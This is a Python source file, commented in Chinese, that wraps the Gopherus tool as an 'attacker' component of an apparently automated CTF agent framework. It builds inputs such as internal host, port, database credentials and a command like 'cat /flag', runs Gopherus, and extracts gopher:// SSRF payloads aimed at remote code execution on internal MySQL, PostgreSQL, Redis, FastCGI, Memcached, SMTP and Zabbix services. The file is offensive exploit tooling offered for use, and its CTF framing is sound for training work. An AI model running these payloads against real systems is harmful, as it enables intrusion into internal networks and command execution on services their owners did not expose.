# tools/gopherus_tool.py
"""
Gopherus Tool - Gopher Payload 生成器

功能:
- 生成 Gopher 协议 Payload
- 支持多种服务: MySQL, PostgreSQL, Redis, FastCGI, Memcached, SMTP
- SSRF 场景利用

特点:
- 自动生成利用 Payload
- 支持多种数据库和服务
- 命令执行利用

CTF优化:
- 简化参数，直接指定服务类型
- 自动编码输出
"""
import os
import sys
import shutil
from typing import Dict, Any, List
from tool_framework import CommandLineTool


class GopherusTool(CommandLineTool):
    """
    Gopherus Gopher Payload生成工具封装

    生成可直接用于 SSRF 的 Gopher Payload
    """

    # 前置条件
    REQUIRES_CREDENTIALS = False
    REQUIRES_SHELL_SESSION = False
    TOOL_CATEGORY = "attacker"  # 攻击工具

    # 支持的服务类型
    SUPPORTED_SERVICES = {
        "mysql": "MySQL 数据库 (需要用户名/密码)",
        "postgres": "PostgreSQL 数据库",
        "redis": "Redis 数据库",
        "fastcgi": "FastCGI (PHP RCE)",
        "memcached": "Memcached 缓存",
        "smtp": "SMTP 邮件服务",
        "zabbix": "Zabbix 监控"
    }

    def __init__(self):
        cmd = "python3" if os.path.exists("/.dockerenv") else sys.executable
        super().__init__(cmd)

        # 脚本路径
        docker_path = "/app/thirdparty/Gopherus/gopherus.py"
        local_path = os.path.join(os.getcwd(), "thirdparty", "Gopherus", "gopherus.py")
        self.script_path = docker_path if os.path.exists(docker_path) else local_path
        self.timeout = 60

    def name(self) -> str:
        return "gopherus"

    def description(self) -> str:
        return "Gopher Payload生成器，为SSRF攻击生成MySQL/Redis/FastCGI等服务的利用Payload。"

    def supported_vulns(self) -> list:
        return [
            "SSRF",
            "MySQL RCE",
            "Redis RCE",
            "FastCGI RCE",
            "PostgreSQL RCE",
            "Gopher Protocol"
        ]

    def capability_statement(self) -> str:
        return "Gopher Payload生成器。输入服务类型和命令，生成用于SSRF的Gopher协议Payload。适合：SSRF深度利用、内网数据库攻击。分析兵节点使用。"

    def check_available(self) -> bool:
        """检查 Gopherus 是否可用"""
        if not shutil.which("python3" if os.path.exists("/.dockerenv") else "python"):
            return False
        return self.script_path is not None and os.path.exists(self.script_path)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "service": {
                "type": "str",
                "description": f"服务类型: {', '.join(self.SUPPORTED_SERVICES.keys())}",
                "required": True
            },
            "command": {
                "type": "str",
                "description": "要执行的命令 (如 'id', 'cat /flag', MySQL查询等)",
                "required": False,
                "default": "id"
            },
            "host": {
                "type": "str",
                "description": "目标主机 (内网IP)",
                "required": False,
                "default": "127.0.0.1"
            },
            "port": {
                "type": "int",
                "description": "目标端口",
                "required": False
            },
            "username": {
                "type": "str",
                "description": "数据库用户名 (MySQL/PostgreSQL需要)",
                "required": False
            },
            "password": {
                "type": "str",
                "description": "数据库密码 (MySQL/PostgreSQL需要)",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """
        执行 Gopherus 生成 Payload
        """
        service = params.get("service", "").lower()
        command = params.get("command", "id")
        host = params.get("host", "127.0.0.1")
        port = params.get("port")
        username = params.get("username", "")
        password = params.get("password", "")

        if not service:
            return {"error": "必须提供服务类型", "success": False}

        if service not in self.SUPPORTED_SERVICES:
            return {
                "error": f"不支持的服务类型: {service}。支持: {', '.join(self.SUPPORTED_SERVICES.keys())}",
                "success": False
            }

        if not self.check_available():
            return {
                "error": "Gopherus 不可用，请检查安装",
                "success": False
            }

        # 构建命令 - Gopherus 是交互式的，需要 echo 管道输入
        # 基本格式: echo -e "1\nroot\npassword\nid\n" | python gopherus.py --exploit mysql
        cmd = [self.cmd_path, self.script_path, "--exploit", service]

        print(f"[Gopherus] Executing: {' '.join(cmd)}")

        try:
            # 根据不同服务构建输入
            inputs = self._build_input(service, host, port, username, password, command)
            input_text = "\n".join(inputs) + "\n"

            raw_result = self._run_command(
                cmd,
                timeout=self.timeout,
                input_data=input_text,
                stream_output=True
            )
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            # 提取生成的 Payload
            payload = ""
            gopher_start = stdout.find("gopher://")
            if gopher_start != -1:
                # 找到 payload 结束位置
                gopher_end = stdout.find("\n", gopher_start)
                if gopher_end == -1:
                    gopher_end = len(stdout)
                payload = stdout[gopher_start:gopher_end].strip()

            success = "gopher://" in stdout.lower() or len(payload) > 0

            return {
                "success": success,
                "service": service,
                "command": command,
                "host": host,
                "port": port,
                "payload": payload,
                "payload_length": len(payload),
                "summary": f"生成 {service} Gopher Payload {'成功' if success else '失败'}",
                "usage": f"使用方法: 在SSRF参数中填入 {payload}" if payload else "",
                "stdout": stdout
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "service": service
            }

    def _build_input(self, service: str, host: str, port: int, username: str, password: str, command: str) -> List[str]:
        """根据服务类型构建交互输入"""
        inputs = []

        if service == "mysql":
            inputs = [
                host or "127.0.0.1",
                str(port) if port else "3306",
                username or "root",
                password or "",
                command
            ]
        elif service == "postgres":
            inputs = [
                host or "127.0.0.1",
                str(port) if port else "5432",
                username or "postgres",
                password or "",
                command
            ]
        elif service == "redis":
            inputs = [
                host or "127.0.0.1",
                str(port) if port else "6379",
                command
            ]
        elif service == "fastcgi":
            inputs = [
                host or "127.0.0.1",
                str(port) if port else "9000",
                command
            ]
        elif service == "memcached":
            inputs = [
                host or "127.0.0.1",
                str(port) if port else "11211",
                command
            ]
        elif service == "smtp":
            inputs = [
                host or "127.0.0.1",
                str(port) if port else "25",
                command
            ]
        elif service == "zabbix":
            inputs = [
                host or "127.0.0.1",
                str(port) if port else "10051",
                command
            ]
        else:
            inputs = [host or "127.0.0.1", command]

        return inputs


def register():
    """注册 Gopherus 工具"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(GopherusTool())